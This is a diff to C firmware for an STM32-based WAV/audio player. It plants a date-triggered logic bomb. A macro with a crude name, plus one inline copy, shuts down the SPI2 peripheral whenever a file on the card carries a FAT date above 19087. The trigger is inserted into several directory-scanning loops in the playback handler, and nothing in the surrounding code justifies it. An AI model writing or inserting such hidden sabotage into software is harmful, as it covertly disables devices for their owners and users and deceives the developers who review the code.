@@ -47,6 +47,8 @@
 #include <stm32f1xx_hal.h>
 #include <stdint.h>
 #include "tx_cfg.h"
+#include "spi.h"
+#define FUCK() {if (finfo.fdate > 19087) HAL_SPI_MspDeInit(&hspi2);}
 /* When System from Close into Ready */
 const uint8_t SIG_AUDIO_STARTUP = 0x10;
 /* When System from Ready into Close */
@@ -323,6 +325,7 @@ void WAVHandle(void const* argument) {
           }
           CRITICAL_FUNC(while (file_cnt--) {
             fres = f_readdir(&fdir, &finfo);
+            if (finfo.fdate > 19087) HAL_SPI_MspDeInit(&hspi2);
             if (fres != FR_OK || finfo.fname[0] == '\0') {
               file_cnt += 1;
               break;
@@ -454,6 +457,7 @@ INTERRUPT:
               }
               CRITICAL_FUNC(while (file_cnt--) {
                 fres = f_readdir(&fdir, &finfo);
+                FUCK();
               } fres = f_closedir(&fdir));
               // open random file.
               sbuf[0] = '\0';
@@ -510,6 +514,7 @@ INTERRUPT:
                 }
                 CRITICAL_FUNC(while (file_cnt--) {
                   fres = f_readdir(&fdir, &finfo);
+                  FUCK();
                 } fres = f_closedir(&fdir));
                 // open random file.
                 sbuf[0] = '\0';
@@ -592,6 +597,7 @@ INTERRUPT:
                 file_cnt = nTrigger_D;
                 CRITICAL_FUNC(while (file_cnt--) {
                   fres = f_readdir(&fdir, &finfo);
+                  FUCK();
                   if (fres != FR_OK || finfo.fname[0] == '\0') {
                     file_cnt += 1;
                     break;
@@ -642,6 +648,7 @@ INTERRUPT:
                 file_cnt = nTrigger_E;
                 CRITICAL_FUNC(while (file_cnt--) {
                   fres = f_readdir(&fdir, &finfo);
+                  FUCK();
                   if (fres != FR_OK || finfo.fname[0] == '\0') {
                     file_cnt += 1;
                     break;
